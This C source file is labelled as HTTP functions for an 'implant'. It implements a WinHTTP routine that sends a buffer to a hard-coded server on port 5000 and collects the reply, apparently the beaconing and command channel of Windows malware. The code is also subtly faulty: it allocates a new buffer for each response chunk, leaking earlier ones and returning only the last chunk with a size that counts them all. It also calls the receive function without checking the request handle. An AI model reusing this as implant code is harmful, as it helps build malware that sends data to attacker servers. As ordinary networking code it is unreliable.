// HTTP Functions for Implant

#include "http_client.h"

LPBYTE SendToServer(LPCWSTR VERB, LPCWSTR PATH, BYTE *outboundBuffer, size_t outboundBufferSize, size_t *inboundBufferSize) {
	
	HINTERNET hSession = NULL,
				hConnect = NULL,
				hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(
		L"A Custom User Agent",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0);

    // Specify an HTTP server.
	if (hSession) {
		LPCWSTR SERVER_NAME = L"0.0.0.0";
		hConnect = WinHttpConnect(
			hSession,
			SERVER_NAME,
			5000,
			0);
	}
	
	// Create an HTTP request handle.
	if (hConnect) {
		hRequest = WinHttpOpenRequest(
			hConnect,
			VERB,
			PATH,
            NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0);
	}

	BOOL result = FALSE;

	if (hRequest) {
		result = WinHttpSendRequest(
				hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS,
				0,
				outboundBuffer,
				outboundBufferSize,
				outboundBufferSize,
				0);
	}

	// End the request.
	// Receive the response
	result = WinHttpReceiveResponse(hRequest, NULL);

	DWORD tempSize = 0;
	DWORD responseBufferSize = 0;
	BYTE *responseBuffer;
	DWORD dwDownloaded = 0;

	if (result) {
		do {
			// Check for available data
			tempSize = 0;
				
			if (!WinHttpQueryDataAvailable(hRequest, &tempSize)) {
				DEBUG_PRINTF("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
				break;
			}

			if (tempSize == 0) {
				break;
			}
				
			DEBUG_PRINTF("%lu\n", tempSize);
			responseBufferSize += tempSize;
				
			// Allocate space for the data
			responseBuffer = (BYTE *)malloc(tempSize + 1);
				
			if (!responseBuffer) {
				DEBUG_PRINTF("Out of memory\n");
				tempSize = 0;
			} else {
				// Read the data
				ZeroMemory(responseBuffer, tempSize + 1);
					
				if (!WinHttpReadData(
					hRequest,
					(LPVOID)responseBuffer,
					tempSize,
					&dwDownloaded)) {	
						DEBUG_PRINTF("Error %lu in WinHttpReadData.\n", GetLastError());
				} else {
						DEBUG_PRINTF("RESPONSE: [%s]\n", responseBuffer);
				}
			}
		} while (tempSize > 0);
		// Clean up
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);

		*inboundBufferSize = responseBufferSize;
		return responseBuffer;
	}
		// Clean up
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return NULL;
		
}
